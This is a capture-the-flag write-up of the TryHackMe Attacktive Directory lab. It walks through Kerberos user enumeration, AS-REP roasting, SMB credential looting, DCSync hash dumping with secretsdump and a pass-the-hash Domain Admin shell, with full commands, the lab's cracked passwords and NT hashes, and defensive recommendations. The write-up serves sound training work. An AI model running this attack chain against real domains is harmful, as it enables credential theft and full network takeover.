---
title: "Attacktive Directory — TryHackMe Active Directory Penetration Test Writeup"
date: 2026-11-10 18:00:00 +0100
categories: [Writeups, TryHackMe]
tags: [tryhackme, active-directory, kerberos, as-rep-roasting, dcsync, pass-the-hash, smb, impacket, evil-winrm, windows]
description: "A TryHackMe Attacktive Directory write-up covering Kerberos user enumeration, AS-REP Roasting, authenticated SMB enumeration, DCSync credential dumping, and Pass-the-Hash to full domain compromise."
pin: false
toc: true
---

> **Authorized lab / spoiler warning:** This write-up documents an intentionally vulnerable TryHackMe machine used for cybersecurity training. It contains credentials, flags, exploitation steps, and spoilers. If you are actively working on this room, stop reading here.
{: .prompt-warning }

**Platform:** TryHackMe
**Room:** Attacktive Directory
**Difficulty:** Medium
**Status:** Complete — domain fully compromised, all flags captured.

---

## Executive Summary

Attacktive Directory is a TryHackMe room that walks through a realistic Active Directory attack chain against a Windows Server 2019 domain controller. The engagement begins with unauthenticated enumeration and escalates through a series of credential-based pivots until full domain compromise is achieved — without exploiting a single CVE. Every step relies on misconfigurations and weak credential hygiene.

The attack path chains five core AD techniques: **Kerberos user enumeration** via kerbrute to discover valid domain accounts, **AS-REP Roasting** against an account with Kerberos pre-authentication disabled, **authenticated SMB share enumeration** to recover a second set of credentials, **DCSync** leveraging backup-operator replication privileges to dump every password hash in the domain, and **Pass-the-Hash** via Evil-WinRM to obtain an interactive shell as Domain Administrator.

**Flags captured:**
- `svc-admin` password: Found
- `backup` credentials: Found
- `root.txt` (Administrator Desktop): Found

---

## Reconnaissance

### Port Scanning

The engagement began with a full nmap service scan:

```bash
nmap -sC -sV -oN nmap_initial.txt <TARGET_IP>
```

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 53/tcp | open | DNS | Microsoft DNS |
| 80/tcp | open | HTTP | Microsoft IIS httpd 10.0 |
| 88/tcp | open | Kerberos | Microsoft Windows Kerberos |
| 135/tcp | open | MSRPC | Microsoft Windows RPC |
| 139/tcp | open | NetBIOS | Microsoft Windows netbios-ssn |
| 389/tcp | open | LDAP | Microsoft Windows Active Directory LDAP |
| 445/tcp | open | SMB | Windows Server 2019 Standard 17763 |
| 636/tcp | open | LDAPS | |
| 3389/tcp | open | RDP | Microsoft Terminal Services |
| 5985/tcp | open | WinRM | Microsoft HTTPAPI httpd 2.0 |

The combination of **Kerberos (88)**, **LDAP (389)**, and **DNS (53)** on the same host is the signature of an Active Directory Domain Controller. The scan also revealed:

- **Domain:** spookysec.local
- **FQDN:** AttacktiveDirectory.spookysec.local
- **NetBIOS name:** THM-AD
- **OS:** Windows Server 2019 (build 17763)
- **SMB signing:** required (ruling out relay attacks)

Port 80 served the default IIS landing page — no custom web application to attack.

> **Note on AD terminology:** The **domain** (`spookysec.local`) is the logical namespace. The **domain controller** is the server running AD services — identifiable by the Kerberos+LDAP+DNS port combination. The **hostname** (`THM-AD`) is the machine's NetBIOS name. These are distinct concepts that appear in different tool arguments.

### Initial Enumeration

An unauthenticated enumeration pass was run with `enum4linux-ng`:

```bash
enum4linux-ng -A <TARGET_IP>
```

Results were limited — null sessions were allowed on RPC, but nearly every query returned `ACCESS_DENIED`. No shares were listed and no users were enumerated through this channel. The domain metadata (name, SID) was confirmed, but nothing actionable beyond what nmap already revealed.

This is expected behavior on a properly configured DC: anonymous access is restricted, but Kerberos provides an alternative path to user discovery that doesn't require any credentials at all.

---

## Technical Findings & Exploitation

### 1. Kerberos User Enumeration

Active Directory's Kerberos implementation leaks information by design: when a client requests a Ticket Granting Ticket (TGT), the Key Distribution Center (KDC) responds differently depending on whether the username exists. A valid username produces either a TGT or a pre-authentication error; an invalid one returns `KDC_ERR_C_PRINCIPAL_UNKNOWN`. This makes it possible to enumerate valid accounts without credentials.

**kerbrute** exploits this behavior by sending AS-REQ messages for each candidate username and interpreting the responses:

```bash
kerbrute userenum --dc <TARGET_IP> -d spookysec.local userlist.txt
```

The wordlist (`userlist.txt`) was provided by the room. Results:

| Username | Status |
|----------|--------|
| james | Valid |
| svc-admin | Valid |
| robin | Valid |
| darkstar | Valid |
| administrator | Valid |
| backup | Valid |
| paradox | Valid |

Seven valid domain accounts confirmed. Two stood out immediately: `svc-admin` (service accounts are common AS-REP Roasting targets) and `backup` (backup accounts often hold elevated privileges for domain replication).

> **Lesson:** Kerberos user enumeration works without any credentials and produces no failed-login events in the Windows Security event log (no logon attempt is made, only a TGT request). It's one of the first things to try against any exposed Kerberos service.

### 2. AS-REP Roasting

When Kerberos pre-authentication is **enabled** (the default), a client must prove knowledge of the user's password before the KDC will issue an encrypted TGT. When it's **disabled**, the KDC issues an encrypted AS-REP response immediately upon request — and that response is encrypted with the user's password hash, making it crackable offline.

This misconfiguration is queried with Impacket's `GetNPUsers`:

```bash
impacket-GetNPUsers spookysec.local/ -dc-ip <TARGET_IP> -usersfile userlist.txt -no-pass -outputfile asrep_hashes.txt
```

Only one account had pre-authentication disabled: **svc-admin**. The tool retrieved its AS-REP hash (Kerberos 5 AS-REP etype 23).

### 3. Hash Cracking

The AS-REP hash was cracked with John the Ripper against `rockyou.txt`:

```bash
john asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

The password fell almost immediately: **`management2005`**.

> **Lesson:** AS-REP Roasting succeeds because of two compounding mistakes: disabling pre-authentication (an administrative choice) and using a weak, dictionary-crackable password. Either one alone wouldn't have been exploitable — pre-auth disabled with a strong password is uncrackable, and a weak password with pre-auth enabled can't be requested offline. The combination of both is what makes this dangerous.

### 4. Authenticated SMB Enumeration

With valid domain credentials (`svc-admin:management2005`), the locked doors from initial enumeration opened. SMB share listing now succeeded:

```bash
smbclient -L //<TARGET_IP> -U svc-admin
```

| Share | Type | Comment |
|-------|------|---------|
| ADMIN$ | Disk | Remote Admin |
| backup | Disk | |
| C$ | Disk | Default share |
| IPC$ | IPC | Remote IPC |
| NETLOGON | Disk | Logon server share |
| SYSVOL | Disk | Logon server share |

`ADMIN$` and `C$` are administrative shares requiring elevated privileges — `svc-admin` was denied access to both, confirming it's a standard domain account. The non-default **`backup`** share was immediately suspicious.

```bash
smbclient //<TARGET_IP>/backup -U svc-admin
smb: \> ls
  backup_credentials.txt              A       48  Sat Apr  4 21:08:53 2020
smb: \> get backup_credentials.txt
```

The file contained a single base64-encoded string:

```
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

Decoded:

```bash
echo 'YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw' | base64 -d
```

```
backup@spookysec.local:backup2517860
```

Credentials for the **backup** domain account — stored in plaintext (base64 is encoding, not encryption) on a share accessible to any authenticated domain user.

> **Lesson:** Credential files on SMB shares are one of the most common findings in real AD penetration tests. Backup scripts, deployment automation, and admin notes routinely leave plaintext or trivially-encoded credentials on network shares. Always enumerate all accessible shares with every new set of credentials obtained.

### 5. DCSync Attack

In Active Directory, domain controllers replicate their databases to each other using a protocol called **MS-DRSR** (Directory Replication Service Remote). Any account with the **Replicating Directory Changes** and **Replicating Directory Changes All** privileges can request this replication — and the DC will comply, handing over every user's password hash.

Backup accounts are frequently granted these privileges because backing up a domain controller requires the ability to read the full `NTDS.DIT` database, which contains all credential material.

Impacket's `secretsdump` exploits this by impersonating a replication partner:

```bash
impacket-secretsdump -outputfile dcsync -dc-ip <TARGET_IP> spookysec.local/backup:backup2517860@THM-AD
```

The tool successfully used the DRSUAPI method to replicate the entire NTDS.DIT credential store:

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
[... 13 additional domain accounts ...]
```

The output format is `username:RID:LM hash:NT hash`:

- **RID 500** is always the built-in Administrator, like UID 0 is always root on Linux.
- The LM hash `aad3b435b51404eeaad3b435b51404ee` is the hash of an empty string — LM hashing is disabled on modern Windows (it's a legacy, insecure algorithm).
- The **NT hash** is the credential material used for authentication.

The dump also included Kerberos keys (AES-256, AES-128, DES) for every account — the same passwords represented in different encryption formats used by Kerberos.

One observation: the `a-spooks` account shares the exact same NT hash (`0e0363213e37b94221497260b0bcb4fc`) as `Administrator` — meaning they have the same password. This is a common pattern where an "admin" account is created as an operational alias for the built-in Administrator.

> **Lesson:** DCSync is devastating because it requires no access to the domain controller's filesystem — the DC willingly hands over its secrets to any account with replication rights. In a real engagement, finding a single account with these privileges (backup operators, replication service accounts) is equivalent to compromising the entire domain. This is why replication privileges should be audited regularly and granted only to actual domain controller machine accounts.

### 6. Pass-the-Hash — Domain Compromise

With the Administrator's NT hash in hand, there was no need to crack the password. Windows authentication (NTLM) works by comparing hashes, not plaintext — so the hash itself is sufficient to authenticate. This technique is called **Pass-the-Hash**.

Port 5985 (WinRM) was open from the initial scan, making **Evil-WinRM** the tool of choice:

```bash
evil-winrm -i <TARGET_IP> -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Full Administrator access to the domain controller. The root flag was retrieved from the Desktop:

```powershell
cd ~\Desktop
Get-Content root.txt
```

**root.txt:** `[REDACTED]`

> **Lesson:** Pass-the-Hash works because NTLM authentication never transmits or verifies the plaintext password — only the hash. Possessing the hash is functionally equivalent to knowing the password. This is why credential dumping is the single most impactful post-exploitation action in an AD environment: every hash recovered is an authentication token that can be used immediately.

---

## Attack Chain

```
Nmap scan → AD Domain Controller identified
  └─> Kerberos user enumeration (kerbrute)
        └─> 7 valid accounts: james, svc-admin, robin, darkstar, administrator, backup, paradox
              └─> AS-REP Roasting (GetNPUsers) → svc-admin hash
                    └─> John the Ripper → svc-admin:management2005
                          └─> Authenticated SMB enumeration (smbclient)
                                └─> backup share → backup_credentials.txt
                                      └─> Base64 decode → backup:backup2517860
                                            └─> DCSync (secretsdump) → all domain hashes
                                                  └─> Administrator NT hash
                                                        └─> Pass-the-Hash (Evil-WinRM)
                                                              └─> Domain Admin shell → root.txt
```

---

## Lessons Learned

| # | Lesson |
|---|--------|
| 1 | Kerberos user enumeration requires no credentials and generates no failed-logon events — it's invisible to standard monitoring |
| 2 | AS-REP Roasting exploits the combination of disabled pre-authentication AND a weak password — fix either one and the attack fails |
| 3 | Base64 is encoding, not encryption — it provides zero confidentiality |
| 4 | SMB shares are a goldmine during AD pentests — re-enumerate with every new credential set obtained |
| 5 | Backup accounts with replication privileges can DCSync the entire domain without touching the DC's filesystem |
| 6 | NTLM hashes are authentication tokens — possessing the hash is equivalent to knowing the password (Pass-the-Hash) |
| 7 | A single credential chain (svc-admin → backup → Administrator) collapsed the entire domain in under an hour |

---

## Recommendations

| Finding | Risk | Recommendation |
|---------|------|----------------|
| Kerberos pre-authentication disabled on `svc-admin` | High | Enable pre-authentication on all accounts; audit with `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}` |
| Weak password on `svc-admin` (`management2005`) | High | Enforce a minimum 16-character password policy for service accounts; use gMSA (Group Managed Service Accounts) where possible |
| Plaintext credentials on SMB share (`backup_credentials.txt`) | Critical | Remove credential files from shares; use a secrets vault (e.g., Azure Key Vault, CyberArk); audit share contents regularly |
| Backup account with domain replication privileges | High | Restrict replication rights to domain controller machine accounts only; monitor for DCSync activity (Event ID 4662 with replication GUIDs) |
| Password reuse between `Administrator` and `a-spooks` | Medium | Enforce unique passwords across all privileged accounts; deploy LAPS for local admin passwords |
| NTLM authentication enabled | Medium | Restrict NTLM where possible; enforce Kerberos with AES encryption; enable SMB signing (already in place) |
| WinRM exposed to all networks | Medium | Restrict WinRM access via firewall rules to management subnets only |

---

## Appendix — Credentials Found

| Account | Credential | Source |
|---------|-----------|--------|
| svc-admin | `management2005` | AS-REP hash cracked with John/rockyou.txt |
| backup | `backup2517860` | Base64-decoded from `backup_credentials.txt` on SMB share |
| Administrator | NT hash `0e0363213e37b94221497260b0bcb4fc` | DCSync via `secretsdump` (not cracked — used directly via PtH) |

## Appendix — Key Commands

```bash
# Port scanning
nmap -sC -sV -oN nmap_initial.txt <TARGET_IP>

# Initial enumeration (unauthenticated)
enum4linux-ng -A <TARGET_IP>

# Kerberos user enumeration
kerbrute userenum --dc <TARGET_IP> -d spookysec.local userlist.txt

# AS-REP Roasting
impacket-GetNPUsers spookysec.local/ -dc-ip <TARGET_IP> -usersfile userlist.txt -no-pass -outputfile asrep_hashes.txt

# Hash cracking
john asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Authenticated SMB share listing
smbclient -L //<TARGET_IP> -U svc-admin

# SMB share access
smbclient //<TARGET_IP>/backup -U svc-admin
# smb: \> get backup_credentials.txt

# Decode credentials
echo 'YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw' | base64 -d

# DCSync — dump all domain credentials
impacket-secretsdump -outputfile dcsync -dc-ip <TARGET_IP> spookysec.local/backup:backup2517860@THM-AD

# Pass-the-Hash — Administrator shell
evil-winrm -i <TARGET_IP> -u Administrator -H 0e0363213e37b94221497260b0bcb4fc

# Read flags (PowerShell)
Get-Content C:\Users\Administrator\Desktop\root.txt
```

---

*Machine: Attacktive Directory (TryHackMe). Flags redacted per lab policy.*
